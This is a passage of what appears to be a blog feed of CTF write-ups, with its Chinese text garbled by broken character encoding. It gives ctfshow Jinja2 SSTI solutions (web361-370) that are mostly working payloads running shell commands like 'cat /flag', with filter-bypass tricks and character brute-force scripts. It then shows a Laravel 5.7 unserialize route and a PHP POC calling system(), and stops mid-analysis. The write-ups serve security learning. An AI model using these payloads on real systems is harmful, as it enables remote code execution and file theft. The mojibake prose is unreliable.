           &#123;&#123;g&#125;&#125;å¾—åˆ°&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><pre><code>request                 å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    getä¼ å‚request.values.x1  æ‰€æœ‰å‚æ•°request.cookies.x1       cookieså‚æ•°request.headers         è¯·æ±‚å¤´å‚æ•°request.form.x1    postä¼ å‚(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)request.data   postä¼ å‚(Content-Type:a/b)request.json postä¼ json  (Content-Type: application/json)</code></pre><pre><code>&#123;&#123;&#125;&#125;ç§°ä¹‹ä¸ºå˜é‡ä»£ç å—ï¼›&#123;%%&#125;ç§°ä¹‹ä¸ºæ§åˆ¶ä»£ç å—ï¼Œå¯ä»¥å®ç°ä¸€äº›è¯­è¨€å±‚æ¬¡çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¾ªç¯è¯­å¥ã€‚ä¸åŒè¯­è¨€ä¸åŒæ¨¡æ¿çš„ä»£ç å—å½¢å¼ä¸åŒ</code></pre><p>è¿‡æ»¤å™¨ï¼ˆä¾‹ï¼š()|select|string|listï¼‰</p><pre><code>int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;'<em>hello</em>'|safe&#125;&#125;ï¼›list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ä¾‹å¦‚å¾—åˆ°æŠŠå­—å…¸çš„é”®åæ‹¼æ¥åçš„å€¼abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#39;xiaotuo&#39;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</code></pre><h1 id="phpä¸­çš„SSTI"><a href="#phpä¸­çš„SSTI" class="headerlink" title="phpä¸­çš„SSTI"></a>phpä¸­çš„SSTI</h1><h3 id="smart"><a href="#smart" class="headerlink" title="smart"></a>smart</h3><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p><p><a href="https://xz.aliyun.com/t/6885">Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹ </a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">jinjia2æ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTIæ¨¡æ¿æ³¨å…¥æ€»ç»“</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTIæ³¨å…¥(ctfshow)</title>
      <link href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"/>
      <url>/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>payloadï¼ˆè°ƒç”¨äº†â€œos_wrap_closeâ€ï¼‰:</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125; //ä½¿ç”¨å†…å»ºåç§°ç©ºé—´</code></pre><h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>è¿™å…³å¥½åƒæ˜¯é¢‘é—­äº†çˆ¶ç±»ä¸‹é¢çš„æ‰€æœ‰å­ç±»</p><p>payload</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;//è¿™é‡Œçš„xä»»æ„26ä¸ªè‹±æ–‡å­—æ¯çš„ä»»æ„ç»„åˆéƒ½å¯ä»¥</code></pre><h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>è¿™å…³è¿‡æ»¤äº†å•åŒå¼•å·</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨request.argsæ¥ç»•è¿‡æ­¤å¤„å¼•å·çš„è¿‡æ»¤ã€‚</p><p>request.argsæ˜¯flaskä¸­ä¸€ä¸ªå­˜å‚¨ç€è¯·æ±‚å‚æ•°ä»¥åŠå…¶å€¼çš„å­—å…¸</p><pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=eval&amp;c=__import__(&#39;os&#39;).popen(&quot;ls&quot;).read()</code></pre><p>ä¹Ÿå¯ä»¥è€ƒè™‘å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™é‡Œç”¨configæ‹¿åˆ°å­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒéº»çƒ¦å°±ä¸å…¨æ¼”ç¤ºäº†</p><pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</code></pre><p>ç›¸å½“äº?name&#x3D;</p><h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>è¿™å…³è¿‡æ»¤äº†å¼•å·å’Œargsï¼Œç”¨request.fromæäº¤å‘ç°ä¸å…è®¸ï¼Œä½†å¯ä»¥ç”¨cookies</p><pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;Cookie: a=os;b=popen;c=ls</code></pre><p>è¿˜å¯ä»¥ç”¨chr()å‡½æ•°ç»•è¿‡</p><p><strong>ä¸­æ‹¬å·å®é™…ä¸Šå½±å“æˆ‘ä»¬çš„åªæœ‰ä»æ•°ç»„ä¸­å–å€¼ï¼Œä¾‹å¦‚__bases__()[1]ï¼Œè€Œåç»­çš„ä¸­æ‹¬å·å®é™…æ˜¯ä¸å¿…è¦çš„ï¼Œglobals[â€œosâ€]å¯ä»¥æ›¿æ¢ä¸ºglobals.os</strong></p><p>æ‰€ä»¥é¦–å…ˆfuzzä¸€ä¸‹chr()å‡½æ•°åœ¨å“ªï¼š</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[Â§0Â§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><img src="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/163654.png" class=""><p>å¯ä»¥çœ‹åˆ°çˆ†å‡ºäº†å¾ˆå¤šï¼Œéšä¾¿é€‰ä¸€ä¸ª</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>æ¥ç€å°è¯•ä½¿ç”¨chrå°è¯•ç»•è¿‡åç»­æ‰€æœ‰çš„å¼•å·ï¼š</p><pre><code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()&#125;&#125;</code></pre><h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>è¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œä½†è¿‡æ»¤äº†ä¸­æ‹¬å·å®é™…ä¸Šå½±å“æˆ‘ä»¬çš„åªæœ‰ä»æ•°ç»„ä¸­å–å€¼ï¼Œè€Œä»æ•°ç»„ä¸­å–å€¼å¯ä»¥ä½¿ç”¨pop&#x2F;<strong>getitem</strong>ç­‰æ•°ç»„è‡ªå¸¦æ–¹æ³•ã€‚ä¸è¿‡è¿˜æ˜¯å»ºè®®ç”¨<strong>getitem</strong>ï¼Œå› ä¸ºpopä¼šç ´åæ•°ç»„çš„ç»“æ„ã€‚</p><p>a[0]ä¸a.<strong>getitem</strong>(0)çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸Šè¿°payloadå¯ä»¥ç”¨æ­¤æ¥ç»•è¿‡ï¼š</p><pre><code>?name=&#123;&#123;&#123;&#125;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a).read()&#125;&#125;</code></pre><p>è¿™é‡Œä¹Ÿå°è¯•ç”¨ä¸€ä¸‹å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå†™ä¸ªpythonè„šæœ¬è·‘å‡ºæ¥ï¼š</p><pre><code>import requestsurl=&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;payload=&quot;cat /flag&quot;result=&quot;&quot;for j in payload:    for i in range(0,1000):        r=requests.get(url=url%(i))        location=r.text.find(&quot;&lt;h3&gt;&quot;)        word=r.text[location+4:location+5]        if word==j:            print(&quot;config.__str__().__getitem__(%d)  ==  %s&quot;%(i,j))            result+=&quot;config.__str__().__getitem__(%d)~&quot;%(i)            breakprint(result[:len(result)-1])</code></pre><pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)).read()&#125;&#125;</code></pre><p>æ³¨ï¼š<code>__getitem__()</code>ä¹Ÿå¯ä»¥ç”¨<code>get()</code>æ¥ä»£æ›¿</p><h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šåˆbanäº†<code>_</code>,ç”¨url_for.(request.cookies.a)çš„è¯ä¼š500ï¼Œè¿™å…³å°±ç”¨flaskè‡ªå¸¦çš„è¿‡æ»¤å™¨attr</p><p>å‚è€ƒ<a href="https://docs.jinkan.org/docs/jinja2/templates.html#id36">https://docs.jinkan.org/docs/jinja2/templates.html#id36</a></p><p>ä¾‹å¦‚foo|attr(â€œbarâ€)çš„æ„æ€å°±æ˜¯foo[â€œbarâ€]</p><p>payload</p><pre><code>?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;Cookieä¼ å‚ï¼šx1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></pre><p>or</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;ä¼ å‚ï¼ša=__globals__;b=cat /f*</code></pre><h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>è¿‡æ»¤äº†os</p><p>payload</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()&#125;&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><pre><code>banäº†&#123;\&#123;ï¼Œå°±è¦æƒ³åŠæ³•æ‹¿&#123;% %&#125;æ¥ç»•è¿‡ã€‚æŠŠä¸Šä¸€é¢˜çš„æ”¹ä¸€ä¸‹å°±èƒ½ç›´æ¥ç”¨äº†ï¼š</code></pre><pre><code>?name=&#123;%print((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read())%&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><p>banäº†requestï¼Œå°±æƒ³åŠæ³•è‡ªå·±å‡‘å­—ç¬¦äº†ï¼Œè¿™é‡Œæ‹¿configæ¥å‡‘ã€‚ä½†æ˜¯ä¸€ä¸ªé—®é¢˜æ˜¯_è¢«banäº†ï¼Œæ‰€ä»¥__str__()ç”¨ä¸äº†ï¼Œè¿™é‡Œæ‹¿stringè¿‡æ»¤å™¨æ¥å¾—åˆ°configçš„å­—ç¬¦ä¸²ï¼šconfig|stringï¼Œä½†æ˜¯è·å¾—å­—ç¬¦ä¸²åæœ¬æ¥åº”è¯¥ç”¨ä¸­æ‹¬å·æˆ–è€…__getitem__()ï¼Œä½†æ˜¯é—®é¢˜æ˜¯_è¢«banäº†ï¼Œæ‰€ä»¥è·å–å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå­—ç¬¦æ¯”è¾ƒå›°éš¾ï¼Œè¿™é‡Œè½¬æ¢æˆåˆ—è¡¨ï¼Œå†ç”¨åˆ—è¡¨çš„popæ–¹æ³•å°±å¯ä»¥æˆåŠŸå¾—åˆ°æŸä¸ªå­—ç¬¦äº†ï¼Œåœ¨è·‘å­—ç¬¦çš„æ—¶å€™å‘ç°æ²¡æœ‰å°å†™çš„bï¼Œåªæœ‰å¤§å†™çš„Bï¼Œæ‰€ä»¥å†å»ä¸€å±‚.lower()æ–¹æ³•ï¼Œæ–¹ä¾¿è·‘æ›´å¤šå­—ç¬¦ï¼Œå†™ä¸ªè„šæœ¬ï¼š</p><pre><code>import requestsurl=&quot;http://8db9791d-549f-4151-a095-6bfbce54ba2b.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;payload=&quot;cat /flag&quot;raws=&quot;&quot;for i in payload:    for j in range(0,1000):        result=requests.get(url=url.format(j))        location=result.text.find(&quot;&lt;h3&gt;&quot;)        ak=result.text[location+4:location+5]        if(ak==i):            print(&quot;(config|string|list).pop(&#123;&#125;).lower==&#123;&#125;&quot;.format(j,i))            raws+=&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;.format(j)            breakprint(raws)</code></pre><p>æœ€ç»ˆpayload</p><pre><code>?name=&#123;% print ((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()) %&#125;</code></pre><p>è¿˜æœ‰ä¸€ç§yuå¸ˆå‚…çš„å§¿åŠ¿</p><pre><code>http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;&#123;% set chr=a.chr %&#125;&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</code></pre><p>è¿™æ˜¯æ–°çš„æ‹¼æ¥å­—ç¬¦çš„æ–¹å¼ï¼Œä¾‹å¦‚:</p><pre><code>&#123;% set a=dict(o=oo,s=ss)|join %&#125;</code></pre><p>è¿™æ ·å¾—åˆ°çš„aå°±æ˜¯æŠŠè¿™ä¸ªå­—å…¸çš„é”®åæ‹¼æ¥åçš„å€¼ï¼Œå³os</p><h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>banäº†æ•°å­—ï¼Œå¯ä»¥æŠŠä¸€äº›ä¸œè¥¿è½¬stringå†è½¬listï¼Œç„¶åç”¨indexï¼Œç„¶ååŸºæœ¬ä¸Šæ‰€æœ‰æ•°å­—éƒ½å¯ä»¥æ‹¿åˆ°</p><pre><code>&#123;% set o=(dict(o=z)|join) %&#125;&#123;% set n=dict(n=z)|join %&#125;&#123;% set f=dict(f=z)|join %&#125;&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;&#123;% set qi=(config|string|list).index(n)%2B(config|string|list).index(f)%&#125;&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;&#123;% set kongge=(config|string|list).pop(qi)%&#125;&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;&#123;% set gangfulaige=(dict(cat=d)|join,kongge,xiegang,dict(flag=z)|join)|join %&#125;&#123;% set ha=dict(o=x,s=k)|join%&#125;&#123;% print (lipsum|attr(globals)).get(ha).popen(gangfulaige).read() %&#125;</code></pre><p>yuå¸ˆå‚…çš„å§¿åŠ¿ï¼Œå¯ä»¥ç”¨lengthå¾ˆæ–¹ä¾¿çš„å¾—åˆ°æ•°å­—ï¼š</p><pre><code>&#123;% set one=(dict(c=z)|join|length) %&#125;&#123;% set two=(dict(cc=z)|join|length) %&#125;</code></pre><p>è¿˜æœ‰ä¸€ç§ç”¨è¿‡æ»¤å™¨intå¾—åˆ°æ•°å­—çš„æ–¹å¼ï¼š</p><pre><code>&#123;% set ten=(dict(aaaaaaaaaa=a)|join|count)%&#125;&#123;% set two=(dict(aa=a)|join|count)%&#125;&#123;% set twofour=( two~four)|int%&#125;&#123;% set a=(()|select|string|list).pop(twofour)%&#125;&#123;% set chr=a.chr%&#125;&#123;% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%&#125;</code></pre><h3 id="web371-372"><a href="#web371-372" class="headerlink" title="**web371~372"></a>**web371~372</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹ï¼š"><a href="#ç®€ä»‹ï¼š" class="headerlink" title="ç®€ä»‹ï¼š"></a>ç®€ä»‹ï¼š</h2><p>å’Œyiiä¸€æ ·ï¼ŒLaravelä¹Ÿæ˜¯ä¸€å¥—ç®€æ´ã€ä¼˜é›…çš„PHPWebå¼€å‘æ¡†æ¶ï¼ˆPHP Web Frameworkï¼‰ã€‚</p><h2 id="ç¯å¢ƒéƒ¨ç½²ï¼š"><a href="#ç¯å¢ƒéƒ¨ç½²ï¼š" class="headerlink" title="ç¯å¢ƒéƒ¨ç½²ï¼š"></a>ç¯å¢ƒéƒ¨ç½²ï¼š</h2><p>ä¸‹è½½æºç ï¼š</p><pre><code>https://github.com/laravel/laravel/tree/5.7</code></pre><p>ç„¶åå°±æ˜¯æ„é€ ä¸€ä¸ªååºåˆ—åŒ–çš„åˆ©ç”¨ç‚¹äº†ï¼Œåœ¨routes&#x2F;web.phpé‡Œé¢åŠ ä¸€æ¡è·¯ç”±ï¼š</p><pre><code>Route::get(&#39;/unserialize&#39;,&quot;UnserializeController@uns&quot;);  //ç±»å@æ–¹æ³•å</code></pre><p>åœ¨App\Http\Controllersä¸‹é¢å†™ä¸€ä¸ªæ§åˆ¶å™¨UnserializeController.phpæ–‡ä»¶ï¼š</p><pre><code>&lt;?phpnamespace App\Http\Controllers;class UnserializeController extends Controller&#123;    public function uns()&#123;        if(isset($_GET[&#39;c&#39;]))&#123;            unserialize($_GET[&#39;c&#39;]);        &#125;else&#123;            highlight_file(__FILE__);        &#125;        return &quot;uns&quot;;    &#125;&#125;</code></pre><h2 id="ååºåˆ—åŒ–é“¾åˆ†æï¼š"><a href="#ååºåˆ—åŒ–é“¾åˆ†æï¼š" class="headerlink" title="ååºåˆ—åŒ–é“¾åˆ†æï¼š"></a>ååºåˆ—åŒ–é“¾åˆ†æï¼š</h2><p>æ¼æ´é“¾çš„èµ·ç‚¹åœ¨vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.phpï¼Œä¸5.6ç›¸æ¯”ï¼Œ5.7å¤šäº†ä¸€ä¸ª<code>PendingCommand.php</code>æ–‡ä»¶ã€‚</p><p>çœ‹ä¸€ä¸‹è¿™ä¸ªæ–°å¢çš„ç±»ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>__destruct()</code></p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/170946.png" class=""><p><code>$this-&gt;hasExecuted</code>é»˜è®¤æ˜¯falseçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿›å…¥runæ–¹æ³•ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/171403.png" class=""><p>è¦æƒ³æ‰§è¡Œåˆ°å¼‚å¸¸å¤„ç†ä»£ç <code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>ä¸­å¾—å…ˆç»è¿‡ $this-&gt;mockConsoleOutput()ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/173138.png" class=""><p>ä¸€å †çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œæ¥ä¸ªpocè¯•è¯•ï¼š</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>ç”Ÿæˆpayloadï¼Œç„¶åä¼ å€¼è¿‡å»ï¼š</p><pre><code>http://127.0.0.1/laravel-5.7/public/index.php/unserialize?c=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7D</code></pre><p>æŠ¥é”™äº†ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/204918.png" class=""><p>æ‰“ä¸€ä¸‹æ–­ç‚¹ï¼Œå‘ç°æ˜¯mockConsoleOutput()æ–¹æ³•ä¸­çš„createABufferedOutputMock()å‡½æ•°ï¼š</p><pre><code>foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;</code></pre><p>æŠ¥é”™çš„åŸå› å°±æ˜¯å› ä¸º<code>$this-&gt;test</code>æ²¡æœ‰expectedOutputè¿™ä¸ªå±æ€§ã€‚è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå±æ€§ï¼Œå‘ç°è¿™ä¸ªå±æ€§åœ¨<code>trait InteractsWithConsole</code>ä¸­ï¼Œtraitç±»æˆ‘ä»¬æ²¡æ³•å®ä¾‹åŒ–ï¼Œæ­¤å¤–å°±åªæœ‰ä¸€äº›æµ‹è¯•ç±»æœ‰è¿™ä¸ªå±æ€§ï¼Œå› æ­¤è¿™é‡Œå°±å¡ä½äº†ã€‚è¿™æ—¶å€™æƒ³åˆ°åˆ©ç”¨__getæ–¹æ³•</p><p>å¤§å¸ˆå‚…ä»¬ç»è¿‡å¯»æ‰¾ï¼Œé€‰æ‹©äº†Illuminate\Auth\GenericUserç±»ï¼š</p><img 